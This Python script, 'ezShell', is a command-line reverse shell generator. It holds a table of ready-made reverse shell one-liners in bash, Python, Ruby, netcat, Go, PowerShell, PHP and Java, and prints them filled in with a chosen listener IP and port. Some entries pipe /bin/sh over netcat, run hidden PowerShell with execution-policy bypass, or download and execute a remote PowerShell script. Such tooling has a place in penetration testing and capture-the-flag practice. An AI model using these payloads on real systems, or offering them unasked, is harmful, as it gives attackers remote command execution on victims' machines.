#!/usr/bin/python3

#========== ezShell ============#
#								#
# Author: fastbyt3				#
#								#
# Description:					#
# 	This is a simple reverse	#
# 	shell generator, used 		#
# 	from the cmdline 			#
#								#
#===============================#


# To access this from anywhere:
# 	- create a dir /usr/bin/ezShell/bin
# 	- wget this script and save op as ezs
# 	- 'ln -s /usr/bin/ezShell/bin/ezs /usr/local/bin'
# 	- now just call 'ezs'


import argparse
import sys
from os import system
from colorama import Fore,Back

parser = argparse.ArgumentParser()
parser.add_argument("ip", help="ip addr of host/listener")
parser.add_argument("port", help="port no of listener")
parser.add_argument("-l", "--lang", help="programming language of reverse shell")
args = parser.parse_args()

shells = {
    "bash": ["bash -i >& /dev/tcp/ip_addr/port_no 0>&1"],
    "py3": ["python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip_addr\",port_no));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"],
    "py2": ["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip_addr\",port_no));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"],
    "ruby": ["ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"ip_addr\",\"port_no\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'"],
    "nc": [
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f",
        "nc -e /bin/sh 10.0.0.1 4242"
    ],
    "go": ["echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"ip_addr:port_no\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"],
    "ps":[
    	"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"ip_addr\",port_no);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
    	"powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')"
    ],
    "php": ["php -r '$sock=fsockopen(\"ip_addr\",port_no);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"],
    "java": ["Runtime r = Runtime.getRuntime();\nProcess p = r.exec(\"/bin/bash -c 'exec 5<>/dev/tcp/ip_addr/port_no;cat <&5 | while read line; do $line 2>&5 >&5; done'\");\np.waitFor();"]
}

if not args.lang:
	for key, value in shells.items():
		print(Fore.RED, f"prog lang: {key}")
		for x in value:                            
			x = x.replace("ip_addr", args.ip)
			x = x.replace("port_no", args.port)       
			print(Fore.GREEN, f"\n{x}")    
		print("\n========================================================")          

else:
	cmds = shells[args.lang]
	for cmd in cmds:
		ip = args.ip
		if args.ip == "tun0":
			pass
		elif args.ip == "localhost":
			ip = "127.0.0.1"
		elif args.ip == "eth0":
			pass
		cmd = cmd.replace("ip_addr", ip)
		cmd	= cmd.replace("port_no", args.port)       
		print(Back.BLACK, Fore.GREEN, f"{cmd}\n")
